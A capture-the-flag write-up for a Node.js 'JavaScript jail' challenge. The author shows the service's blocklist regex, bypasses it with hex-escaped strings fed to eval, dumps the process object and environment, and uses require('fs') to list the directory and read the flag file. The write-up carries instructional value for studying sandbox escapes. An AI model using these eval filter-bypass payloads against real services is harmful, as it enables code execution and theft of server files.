# **jail**

#### tag : misc

-------------------------------------------------------------------------------------------------------

#### Description

>nc challenges.whitehatcontest.kr 5959

-------------------------------------------------------------------------------------------------------

#### Solution

Well, I connect to link given and get java-script jail like:

~~~

$ nc challenges.whitehatcontest.kr 5959
Hello Java-Script Jail
type: hint, quit
>

~~~

I get hint about filtering regex and quit is just exit the jail:

~~~

> hint
(input) => (new RegExp(/with|\.|;|new| |'|child|crypto|os|http|dns|net|tr|tty|zlib|punycode|util|url|ad|nc|>|`|\+|ex|=/i).test(input))
> quit

~~~

I can use number or string to input like:

~~~

> 1
your input 1
> "A"
your input A

~~~

When I don't use number or alphabet, I get message "hm":

~~~

> a
hm..

~~~

When I use banned characters in regexp, I get message "nop":

~~~

> '
nop

~~~

But, command is work!

I just try to use console, it work, and I get input is object:

~~~

> console
your input [object Object]

~~~

I have to use console.log to get this values of object, but there is '.' is filtered in regex.

So I try to bypass filtering, and I find if I use ascii, it bypass filtering!

Well, I input ascii codes that mean "console.log" which is include '.':


~~~

> "\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x63\x6f\x6e\x73\x6f\x6c\x65\x29"
your input console.log(console)

~~~

Yeah!

And I have to run this string, well, there is "eval" in javascript:

~~~

> eval
your input function eval() { [native code] }

~~~

~~~

> eval("\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x63\x6f\x6e\x73\x6f\x6c\x65\x29")
Console {
  log: [Function: bound consoleCall],
  info: [Function: bound consoleCall],
  warn: [Function: bound consoleCall],
  error: [Function: bound consoleCall],
  dir: [Function: bound consoleCall],
  time: [Function: bound consoleCall],
  timeEnd: [Function: bound consoleCall],
  trace: [Function: bound consoleCall],
  assert: [Function: bound consoleCall],
  clear: [Function: bound consoleCall],
  count: [Function: bound consoleCall],
  countReset: [Function: bound countReset],
  group: [Function: bound consoleCall],
  groupCollapsed: [Function: bound consoleCall],
  groupEnd: [Function: bound consoleCall],
  Console: [Function: Console],
  debug: [Function: debug],
  dirxml: [Function: dirxml],
  table: [Function: table],
  markTimeline: [Function: markTimeline],
  profile: [Function: profile],
  profileEnd: [Function: profileEnd],
  timeline: [Function: timeline],
  timelineEnd: [Function: timelineEnd],
  timeStamp: [Function: timeStamp],
  context: [Function: context],
  [Symbol(counts)]: Map {} }

~~~

Well, working! and I want to see process too!

~~~

> eval("\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x70\x72\x6f\x63\x65\x73\x73\x29")
process {
  title: 'node',
  version: 'v8.7.0',
  moduleLoadList:
   [ 'Binding contextify',
     'Binding natives',
     'Binding config',
     'NativeModule events',
     'Binding async_wrap',
     'Binding icu',
     'NativeModule util',
     'NativeModule internal/errors',
     'NativeModule internal/encoding',
     'NativeModule internal/util',
     'Binding util',
     'Binding constants',
     'Binding buffer',
     'NativeModule buffer',
     'NativeModule internal/buffer',
     'Binding uv',
     'NativeModule internal/process',
     'NativeModule internal/process/warning',
     'NativeModule internal/process/next_tick',
     'NativeModule async_hooks',
     'NativeModule internal/process/promises',
     'NativeModule internal/process/stdio',
     'NativeModule timers',
     'Binding timer_wrap',
     'NativeModule internal/linkedlist',
     'NativeModule assert',
     'NativeModule module',
     'NativeModule internal/module',
     'NativeModule internal/url',
     'NativeModule internal/querystring',
     'NativeModule querystring',
     'Binding url',
     'NativeModule vm',
     'NativeModule fs',
     'NativeModule path',
     'Binding fs',
     'NativeModule stream',
     'NativeModule internal/streams/legacy',
     'NativeModule _stream_readable',
     'NativeModule internal/streams/BufferList',
     'NativeModule internal/streams/destroy',
     'NativeModule _stream_writable',
     'NativeModule _stream_duplex',
     'NativeModule _stream_transform',
     'NativeModule _stream_passthrough',
     'Binding fs_event_wrap',
     'NativeModule internal/fs',
     'NativeModule internal/loader/Loader',
     'NativeModule url',
     'NativeModule internal/loader/ModuleWrap',
     'Binding module_wrap',
     'NativeModule internal/loader/ModuleMap',
     'NativeModule internal/loader/ModuleJob',
     'NativeModule internal/safe_globals',
     'NativeModule internal/loader/resolveRequestUrl',
     'NativeModule internal/loader/search',
     'NativeModule console',
     'Binding tty_wrap',
     'NativeModule net',
     'NativeModule internal/net',
     'Binding cares_wrap',
     'Binding tcp_wrap',
     'Binding pipe_wrap',
     'Binding stream_wrap',
     'NativeModule dns',
     'Binding inspector',
     'Binding performance',
     'NativeModule perf_hooks',
     'NativeModule internal/inspector_async_hook',
     'NativeModule readline',
     'NativeModule string_decoder',
     'NativeModule internal/readline' ],
  versions: { http_parser: '2.7.0',
  node: '8.7.0',
  v8: '6.1.534.42',
  uv: '1.15.0',
  zlib: '1.2.11',
  ares: '1.10.1-DEV',
  modules: '57',
  nghttp2: '1.25.0',
  openssl: '1.0.2l',
  icu: '59.1',
  unicode: '9.0',
  cldr: '31.0.1',
  tz: '2017b' },
  arch: 'x64',
  platform: 'linux',
  release:
   { name: 'node',
     sourceUrl: 'https://nodejs.org/download/release/v8.7.0/node-v8.7.0.tar.gz',
     headersUrl: 'https://nodejs.org/download/release/v8.7.0/node-v8.7.0-headers.tar.gz' },
  argv: [ '/usr/local/bin/node', '/home/jail/app' ],
  execArgv: [],
  env:
   { PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
     HOSTNAME: '43bd51bc3c5b',
     NPM_CONFIG_LOGLEVEL: 'info',
     NODE_VERSION: '8.7.0',
     YARN_VERSION: '1.2.0',
     user: 'jail',
     HOME: '/home/jail',
     SOCAT_PID: '11610',
     SOCAT_PPID: '1',
     SOCAT_VERSION: '1.7.3.2',
     SOCAT_SOCKADDR: '172.17.0.2',
     SOCAT_SOCKPORT: '8888',
     SOCAT_PEERADDR: '119.197.235.93',
     SOCAT_PEERPORT: '63072' },
  pid: 11611,
  features:
   { debug: false,
     uv: true,
     ipv6: true,
     tls_npn: true,
     tls_alpn: true,
     tls_sni: true,
     tls_ocsp: true,
     tls: true },
  _needImmediateCallback: false,
  execPath: '/usr/local/bin/node',
  debugPort: 9229,
  _startProfilerIdleNotifier: [Function: _startProfilerIdleNotifier],
  _stopProfilerIdleNotifier: [Function: _stopProfilerIdleNotifier],
  _getActiveRequests: [Function: _getActiveRequests],
  _getActiveHandles: [Function: _getActiveHandles],
  reallyExit: [Function: reallyExit],
  abort: [Function: abort],
  chdir: [Function: chdir],
  cwd: [Function: cwd],
  umask: [Function: umask],
  getuid: [Function: getuid],
  geteuid: [Function: geteuid],
  setuid: [Function: setuid],
  seteuid: [Function: seteuid],
  setgid: [Function: setgid],
  setegid: [Function: setegid],
  getgid: [Function: getgid],
  getegid: [Function: getegid],
  getgroups: [Function: getgroups],
  setgroups: [Function: setgroups],
  initgroups: [Function: initgroups],
  _kill: [Function: _kill],
  _debugProcess: [Function: _debugProcess],
  _debugPause: [Function: _debugPause],
  _debugEnd: [Function: _debugEnd],
  hrtime: [Function: hrtime],
  cpuUsage: [Function: cpuUsage],
  dlopen: [Function: dlopen],
  uptime: [Function: uptime],
  memoryUsage: [Function: memoryUsage],
  binding: [Function: binding],
  _linkedBinding: [Function: _linkedBinding],
  _setupDomainUse: [Function: _setupDomainUse],
  _events:
   { warning: [Function],
     newListener: [Function],
     removeListener: [Function] },
  _rawDebug: [Function],
  _eventsCount: 3,
  domain: null,
  _maxListeners: undefined,
  _fatalException: [Function],
  _exiting: false,
  assert: [Function],
  config:
   { target_defaults:
      { cflags: [],
        default_configuration: 'Release',
        defines: [],
        include_dirs: [],
        libraries: [] },
     variables:
      { asan: 0,
        coverage: false,
        debug_devtools: 'node',
        debug_http2: false,
        debug_nghttp2: false,
        force_dynamic_crt: 0,
        gas_version: '2.28',
        host_arch: 'x64',
        icu_data_file: 'icudt59l.dat',
        icu_data_in: '../../deps/icu-small/source/data/in/icudt59l.dat',
        icu_endianness: 'l',
        icu_gyp_path: 'tools/icu/icu-generic.gyp',
        icu_locales: 'en,root',
        icu_path: 'deps/icu-small',
        icu_small: true,
        icu_ver_major: '59',
        node_byteorder: 'little',
        node_enable_d8: false,
        node_enable_v8_vtunejit: false,
        node_install_npm: true,
        node_module_version: 57,
        node_no_browser_globals: false,
        node_prefix: '/usr/local',
        node_release_urlbase: '',
        node_shared: false,
        node_shared_cares: false,
        node_shared_http_parser: false,
        node_shared_libuv: false,
        node_shared_openssl: false,
        node_shared_zlib: false,
        node_tag: '',
        node_use_bundled_v8: true,
        node_use_dtrace: false,
        node_use_etw: false,
        node_use_lttng: false,
        node_use_openssl: true,
        node_use_perfctr: false,
        node_use_v8_platform: true,
        node_without_node_options: false,
        openssl_fips: '',
        openssl_no_asm: 0,
        shlib_suffix: 'so.57',
        target_arch: 'x64',
        uv_parent_path: '/deps/uv/',
        uv_use_dtrace: false,
        v8_enable_gdbjit: 0,
        v8_enable_i18n_support: 1,
        v8_enable_inspector: 1,
        v8_no_strict_aliasing: 1,
        v8_optimized_debug: 0,
        v8_promise_internal_field_count: 1,
        v8_random_seed: 0,
        v8_trace_maps: 0,
        v8_use_snapshot: true,
        want_separate_host_toolset: 0 } },
  emitWarning: [Function],
  nextTick: [Function: nextTick],
  _tickCallback: [Function: _tickCallback],
  _tickDomainCallback: [Function: _tickDomainCallback],
  stdout: [Getter],
  stderr: [Getter],
  stdin: [Getter],
  openStdin: [Function],
  exit: [Function],
  kill: [Function],
  argv0: 'node',
  mainModule:
   Module {
     id: '.',
     exports: {},
     parent: null,
     filename: '/home/jail/app/index.js',
     loaded: true,
     children: [],
     paths:
      [ '/home/jail/app/node_modules',
        '/home/jail/node_modules',
        '/home/node_modules',
        '/node_modules' ] } }

~~~

Well, it is node js system. So, I want to know can I use require?

~~~

eval("\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x72\x65\x71\x75\x69\x72\x65\x29")

{ [Function: require]
  resolve: [Function: resolve],
  main:
   Module {
     id: '.',
     exports: {},
     parent: null,
     filename: '/home/jail/app/index.js',
     loaded: true,
     children: [],
     paths:
      [ '/home/jail/app/node_modules',
        '/home/jail/node_modules',
        '/home/node_modules',
        '/node_modules' ] },
  extensions: { '.js': [Function], '.json': [Function], '.node': [Function] },
  cache:
   { '/home/jail/app/index.js':
      Module {
        id: '.',
        exports: {},
        parent: null,
        filename: '/home/jail/app/index.js',
        loaded: true,
        children: [],
        paths: [Array] } } }

~~~

Good!, Well.. in this situation, I use require to include fs to read flag.

Payload is:

~~~

fs=require('fs')
eval("\x66\x73\x3d\x72\x65\x71\x75\x69\x72\x65\x28\x27\x66\x73\x27\x29")

fs.readdir('./', function(err, path) { console.log('Files '+path); })

eval("\x66\x73\x2e\x72\x65\x61\x64\x64\x69\x72\x28\x27\x2e\x2f\x27\x2c\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x65\x72\x72\x2c\x20\x70\x61\x74\x68\x29\x20\x7b\x20\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x27\x50\x61\x74\x68\x20\x27\x2b\x70\x61\x74\x68\x29\x3b\x20\x7d\x29")

fs.readFile('flag', 'utf8', function (err,data) { console.log(data); })

eval("\x66\x73\x2e\x72\x65\x61\x64\x46\x69\x6c\x65\x28\x27\x66\x6c\x61\x67\x27\x2c\x20\x27\x75\x74\x66\x38\x27\x2c\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x28\x65\x72\x72\x2c\x64\x61\x74\x61\x29\x20\x7b\x20\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x64\x61\x74\x61\x29\x3b\x20\x7d\x29")

~~~

Let's go out of jail!

~~~

> eval("\x66\x73\x3d\x72\x65\x71\x75\x69\x72\x65\x28\x27\x66\x73\x27\x29")
your input [object Object]
> eval("\x66\x73\x2e\x72\x65\x61\x64\x64\x69\x72\x28\x27\x2e\x2f\x27\x2c\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x65\x72\x72\x2c\x20\x70\x61\x74\x68\x29\x20\x7b\x20\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x27\x50\x61\x74\x68\x20\x27\x2b\x70\x61\x74\x68\x29\x3b\x20\x7d\x29")
your input undefined
> Path app,flag
eval("\x66\x73\x2e\x72\x65\x61\x64\x46\x69\x6c\x65\x28\x27\x66\x6c\x61\x67\x27\x2c\x20\x27\x75\x74\x66\x38\x27\x2c\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x28\x65\x72\x72\x2c\x64\x61\x74\x61\x29\x20\x7b\x20\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x64\x61\x74\x61\x29\x3b\x20\x7d\x29")
your input undefined
> flag is {easy~esay!easy?_Jav4-scr1pt~yay}

~~~

**flag easy\~esay\!easy\?\_Jav4\-scr1pt\~yay**
